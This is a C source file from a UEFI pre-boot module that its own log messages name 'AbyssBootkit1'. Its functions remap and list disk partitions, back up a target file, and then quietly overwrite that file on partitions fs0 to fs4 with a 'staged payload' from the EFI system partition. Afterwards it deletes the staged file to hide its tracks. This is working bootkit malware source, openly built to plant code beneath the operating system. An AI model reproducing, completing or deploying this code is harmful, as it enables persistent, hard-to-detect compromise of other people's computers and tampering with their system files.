// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Ntfs
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/MemoryAllocationLib.h
// Provides services to allocate and free memory buffers of various memory types and alignments. The Memory Allocation Library abstracts various common memory allocation operations. This library allows code to be written in a phase-independent manner because the allocation of memory in PEI, DXE, and SMM (for example) is done via a different mechanism. Using a common library interface makes it much easier to port algorithms from phase to phase.
#include <Library/MemoryAllocationLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/DevicePathLib.h
// Provides library functions to construct and parse UEFI Device Paths. This library provides defines, macros, and functions to help create and parse EFI_DEVICE_PATH_PROTOCOL structures.
#include <Library/DevicePathLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h
// Provides services to print a formatted string to a buffer. All combinations of Unicode and ASCII strings are supported.
#include <Library/PrintLib.h>

// https://github.com/tianocore/edk2/blob/master/CryptoPkg/Include/Library/BaseCryptLib.h
// Defines base cryptographic library APIs. The Base Cryptographic Library provides implementations of basic cryptography primitives (Hash Serials, HMAC, RSA, Diffie-Hellman, etc) for UEFI security functionality enabling.
#include <Library/BaseCryptLib.h>

// https://github.com/tianocore/edk2/blob/master/ShellPkg/Include/Library/ShellLib.h
// Provides interface to shell functionality for shell commands and applications.
#include <Library/ShellLib.h>



// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------
// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/LoadedImage.h
// UEFI 2.0 Loaded image protocol definition. Every EFI driver and application is passed an image handle when it is loaded. This image handle will contain a Loaded Image Protocol.
#include <Protocol/LoadedImage.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Remaps partitions by executing the "map -r" command.
	@details        This function utilizes the UEFI Shell to remap all available partitions, ensuring they are accessible for subsequent operations.


	@retval         EFI_SUCCESS         The partitions were successfully remapped.
	@retval         EFI_ABORTED         An error occurred while executing the remap command.
**/
EFI_STATUS
PreBootSetup_UtilsNtfs_RemapPartitions()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (RemapPartitions) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_STATUS CommandStatus = EFI_SUCCESS;
	CHAR16 CommandLine[] = L"map -r";
	CHAR16 *EnvironmentVars[] = { NULL };


	// ---------------------------------------------------------------------------------------------------------------------
	// Execute the "map -r" command
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (LoadImageFileIntoMemory) - Execute shell command: %s\r\n", CommandLine);

	// Cause the shell to parse and execute a command line.
	// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L1313
	Status = ShellExecute(&gImageHandle, CommandLine, TRUE, EnvironmentVars, &CommandStatus);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (RemapPartitions) - ShellExecute failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}

	// Command execution failed
	if (EFI_ERROR(CommandStatus))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (RemapPartitions) - Command 'map -r' failed with status: %r (%llx).\r\n", CommandStatus, CommandStatus);
		return CommandStatus;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Partitions remapped successfully
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (RemapPartitions) - Partitions remapped successfully.\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (RemapPartitions) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Lists the contents of the first 5 mapped partitions (fs0: to fs4:).
	@details        This function iterates over the initial fs-mapped partitions (fs0: to fs4:), executing the "ls" command on each to retrieve a list of files and directories.


	@retval         EFI_SUCCESS         The contents of all partitions were successfully listed.
	@retval         EFI_ABORTED         An error occurred while listing the contents of a partition.
**/
EFI_STATUS
PreBootSetup_UtilsNtfs_ListPartitions()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_STATUS CommandStatus = EFI_SUCCESS;
	CHAR16 CommandLine[256];
	CHAR16 *EnvironmentVars[] = { NULL };
	UINTN PartitionIndex = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate over partitions
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - Iterate over partitions\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop
	for (PartitionIndex = 0; PartitionIndex < 5; PartitionIndex++)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Construct the "ls" command for the current partition

		// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
		UnicodeSPrint(CommandLine, sizeof(CommandLine), L"ls fs%d:\\", PartitionIndex);


		// -----------------------------------------------------------------------------------------------------------------
		// Execute the command
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (LoadImageFileIntoMemory) - Execute shell command: %s\r\n", CommandLine);

		// Cause the shell to parse and execute a command line.
		// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L1313
		Status = ShellExecute(gImageHandle, CommandLine, TRUE, EnvironmentVars, &CommandStatus);

		// Failed
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR,L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - ShellExecute failed for partition fs%d: %r (%llx).\r\n", PartitionIndex, Status, Status);
			// Skip to next partition
			continue;
		}

		// Command execution failed
		if (EFI_ERROR(CommandStatus))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - Command 'ls' failed for partition fs%d with status: %r (%llx).\r\n", PartitionIndex, CommandStatus, CommandStatus);
			// Skip to next partition
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Successfully listed
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - Successfully listed contents of partition fs%d\r\n", PartitionIndex);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (ListPartitions) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Creates a backup of a file if it does not already exist.
	@details        Checks whether a backup file exists for the given source path by appending ".backup" to the original file. If the backup file does not exist, a copy of the original is created under that name. If the backup is already present, no action is taken.


	@param[in]      SourcePath          Full path of the original file to be backed up.
	@param[in]      Env                 NULL-terminated array of environment variables to be used when executing shell-level operations.


	@retval         EFI_SUCCESS         Backup was successfully created or already existed.
	@retval         Others              An error occurred during file access or copy.
**/
EFI_STATUS
PreBootSetup_UtilsNtfs_CreateBackup(
	IN              CONST CHAR16        *SourcePath,
	IN              CHAR16              **Env
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CreateBackup) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_STATUS CommandStatus = EFI_SUCCESS;
	EFI_FILE_HANDLE BackupHandle = NULL;
	CHAR16 BackupPath[260];
	CHAR16 CommandLine[400];


	// ---------------------------------------------------------------------------------------------------------------------
	// Build the backup path

	// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
	UnicodeSPrint(BackupPath, sizeof (BackupPath), L"%s.backup", SourcePath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Try to open the backup file to check if it already exists

	// This function will open a file or directory referenced by filename.
	// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L720
	Status = ShellOpenFileByName(BackupPath, &BackupHandle, EFI_FILE_MODE_READ, 0);

	// Success
	if (!EFI_ERROR(Status) && BackupHandle != NULL)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Close the handle

		// Close an open file handle.
		// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L969
		ShellCloseFile (&BackupHandle);

		// Return
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Build the command to copy original file to backup location

	// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
	UnicodeSPrint(CommandLine, sizeof (CommandLine), L"cp -q %s %s", SourcePath, BackupPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Execute the command

	// Cause the shell to parse and execute a command line.
	// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L1313
	Status = ShellExecute(&gImageHandle, CommandLine, TRUE, Env, &CommandStatus);


	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR,L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CreateBackup) - ShellExecute failed: %r (%llx).\r\n", Status, Status);
	}

	// Command execution failed
	if (EFI_ERROR(CommandStatus))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CreateBackup) - Command 'cp' failed: %r (%llx).\r\n", CommandStatus, CommandStatus);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CreateBackup) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return Status;
}



/**
	@brief          Copies a staged payload from the ESP to the first 5 fs# partitions.
	@details        Iterates over partitions mapped as fs0: to fs4, searching for the specified target subpath. If found, it silently overwrites the file with the staged payload and then deletes the staged file from the ESP.


	@param[in]      StagePath           Full path to the staged payload on the ESP.
	@param[in]      TargetSubPath       Relative path to overwrite on each partition.
	@param[out]     CopiedOut           Set to TRUE if the payload was successfully copied to at least one partition.


	@retval         EFI_SUCCESS         The payload was copied successfully to one or more partitions.
	@retval         EFI_NOT_FOUND       The target file was not found on any partition.
	@retval         Others              Error returned by the UEFI Shell or system services.
**/
EFI_STATUS
PreBootSetup_UtilsNtfs_CopyStageToTargets(
	IN              CONST CHAR16        *StagePath,
	IN              CONST CHAR16        *TargetSubPath,
	OUT             BOOLEAN             *CopiedOut
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	BOOLEAN Copied = FALSE;
	CHAR16 Candidate[260];
	CHAR16 CommandLine[256];
	CHAR16 *EnvironmentVars[] = { NULL };
	UINTN PartitionIndex = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate over partitions
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Iterate over partitions\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop
	for (PartitionIndex = 0; PartitionIndex < 5; ++PartitionIndex)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Build path

		// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
		UnicodeSPrint(Candidate, sizeof(Candidate), L"fs%d:%s", PartitionIndex, TargetSubPath);


		// -----------------------------------------------------------------------------------------------------------------
		// Try to open the target file on this partition to check if it exists

		// This function will open a file or directory referenced by filename.
		// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L720
		EFI_FILE_HANDLE FileHandle = NULL;
		Status = ShellOpenFileByName(Candidate, &FileHandle, EFI_FILE_MODE_READ, 0);


		// Success
		if (!EFI_ERROR(Status) && FileHandle)
		{
			// -------------------------------------------------------------------------------------------------------------
			// Close the handle immediately after confirming existence

			// Close an open file handle.
			// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L969
			ShellCloseFile(&FileHandle);


			// -------------------------------------------------------------------------------------------------------------
			// Target found
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Target found on fs%d\r\n", PartitionIndex);


			// -------------------------------------------------------------------------------------------------------------
			// Backup
			Status = PreBootSetup_UtilsNtfs_CreateBackup(Candidate, EnvironmentVars);
			if (EFI_ERROR(Status))
			{
				continue;
			}


			// -------------------------------------------------------------------------------------------------------------
			// Build a silent copy command

			// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
			// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
			UnicodeSPrint(CommandLine, sizeof(CommandLine), L"cp -q %s %s", StagePath, Candidate);
			EFI_STATUS CommandStatus = EFI_SUCCESS;


			// -------------------------------------------------------------------------------------------------------------
			// Execute the shell command to perform the copy

			// Cause the shell to parse and execute a command line.
			// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L1313
			Status = ShellExecute(&gImageHandle, CommandLine, TRUE, EnvironmentVars, &CommandStatus);

			// Success
			if (!EFI_ERROR(Status) && !EFI_ERROR(CommandStatus))
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Payload successfully copied to fs%d\r\n", PartitionIndex);
				Copied = TRUE;
			}
			// Failed
			else
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Copy failed on fs%d: %r/%r\r\n", PartitionIndex, Status, CommandStatus);
			}
		}
		// Failed
		else
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Target path not present on fs%d\r\n", PartitionIndex);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Delete the staged payload from ESP

	// Produces a Null-terminated Unicode string in an output buffer based on a Null-terminated Unicode format string and variable argument list.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h#L338
	UnicodeSPrint(CommandLine, sizeof(CommandLine), L"rm %s", StagePath);

	// Cause the shell to parse and execute a command line.
	// https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.c#L1313
	(VOID)ShellExecute(&gImageHandle, CommandLine, TRUE, EnvironmentVars, NULL);


	// ---------------------------------------------------------------------------------------------------------------------
	// Report if any copy succeeded
	*CopiedOut = Copied;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Utils/Ntfs.c] (CopyStageToTargets) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return Copied ? EFI_SUCCESS : EFI_NOT_FOUND;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
